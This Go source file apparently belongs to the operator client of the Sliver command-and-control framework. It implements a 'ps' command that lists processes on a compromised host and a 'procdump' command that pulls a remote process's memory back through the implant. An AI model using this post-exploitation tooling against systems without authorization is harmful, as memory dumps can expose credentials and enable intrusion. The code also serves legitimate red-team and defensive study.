package command

import (
	"bytes"
	"fmt"
	"io/ioutil"
	consts "sliver/client/constants"
	"sliver/client/spin"
	pb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func ps(ctx *grumble.Context, rpc RPCServer) {
	pidFilter := ctx.Flags.Int("pid")
	exeFilter := ctx.Flags.String("exe")
	ownerFilter := ctx.Flags.String("owner")

	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	data, _ := proto.Marshal(&sliverpb.PsReq{SliverID: ActiveSliver.Sliver.ID})
	respCh := rpc(&pb.Envelope{
		Type: consts.PsStr,
		Data: data,
	}, defaultTimeout)
	resp := <-respCh
	if resp.Error != "" {
		fmt.Printf(Warn+"Error: %s", resp.Error)
		return
	}
	ps := &sliverpb.Ps{}
	err := proto.Unmarshal(resp.Data, ps)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)

	fmt.Fprintf(table, "pid\tppid\texecutable\towner\t\n")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("pid")),
		strings.Repeat("=", len("ppid")),
		strings.Repeat("=", len("executable")),
		strings.Repeat("=", len("owner")),
	)

	lineColors := []string{}
	for _, proc := range ps.Processes {
		var lineColor = ""
		if pidFilter != -1 && proc.Pid == int32(pidFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if exeFilter != "" && strings.HasPrefix(proc.Executable, exeFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if ownerFilter != "" && strings.HasPrefix(proc.Owner, ownerFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if pidFilter == -1 && exeFilter == "" && ownerFilter == "" {
			lineColor = printProcInfo(table, proc)
		}

		// Should be set to normal/green if we rendered the line
		if lineColor != "" {
			lineColors = append(lineColors, lineColor)
		}
	}
	table.Flush()

	for index, line := range strings.Split(outputBuf.String(), "\n") {
		if len(line) == 0 {
			continue
		}
		// We need to account for the two rows of column headers
		if 0 < len(line) && 2 <= index {
			lineColor := lineColors[index-2]
			fmt.Printf("%s%s%s\n", lineColor, line, normal)
		} else {
			fmt.Printf("%s\n", line)
		}
	}

}

// printProcInfo - Stylizes the process information
func printProcInfo(table *tabwriter.Writer, proc *sliverpb.Process) string {
	color := normal
	if modifyColor, ok := knownProcs[proc.Executable]; ok {
		color = modifyColor
	}
	if ActiveSliver.Sliver != nil && proc.Pid == ActiveSliver.Sliver.PID {
		color = green
	}
	fmt.Fprintf(table, "%d\t%d\t%s\t%s\t\n", proc.Pid, proc.Ppid, proc.Executable, proc.Owner)
	return color
}

func procdump(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	pid := ctx.Flags.Int("pid")
	name := ctx.Flags.String("name")
	timeout := ctx.Flags.Int("timeout")
	if pid == -1 && name != "" {
		pid = getPIDByName(name, rpc)
	}
	if pid == -1 {
		fmt.Printf(Warn + "Invalid process target\n")
		return
	}

	if timeout < 1 {
		fmt.Printf(Warn + "Invalid timeout argument\n")
		return
	}

	ctrl := make(chan bool)
	go spin.Until("Dumping remote process memory ...", ctrl)
	data, _ := proto.Marshal(&sliverpb.ProcessDumpReq{
		SliverID: ActiveSliver.Sliver.ID,
		Pid:      int32(pid),
		Timeout:  int32(timeout),
	})
	respCh := rpc(&pb.Envelope{
		Type: consts.ProcdumpStr,
		Data: data,
	}, time.Duration(timeout+1)*time.Second)
	resp := <-respCh
	ctrl <- true

	procDump := &sliverpb.ProcessDump{}
	proto.Unmarshal(resp.Data, procDump)
	if procDump.Err != "" {
		fmt.Printf(Warn+"Error %s\n", procDump.Err)
		return
	}

	hostname := ActiveSliver.Sliver.Hostname
	f, err := ioutil.TempFile("", fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
	if err != nil {
		fmt.Printf(Warn+"Error creating temporary file: %v\n", err)
	}
	f.Write(procDump.GetData())
	fmt.Printf(Info+"Process dump stored in %s\n", f.Name())
}

func getPIDByName(name string, rpc RPCServer) int {
	data, _ := proto.Marshal(&sliverpb.PsReq{SliverID: ActiveSliver.Sliver.ID})
	respCh := rpc(&pb.Envelope{
		Type: consts.PsStr,
		Data: data,
	}, defaultTimeout)
	resp := <-respCh
	ps := &sliverpb.Ps{}
	proto.Unmarshal(resp.Data, ps)
	for _, proc := range ps.Processes {
		if proc.Executable == name {
			return int(proc.Pid)
		}
	}
	return -1
}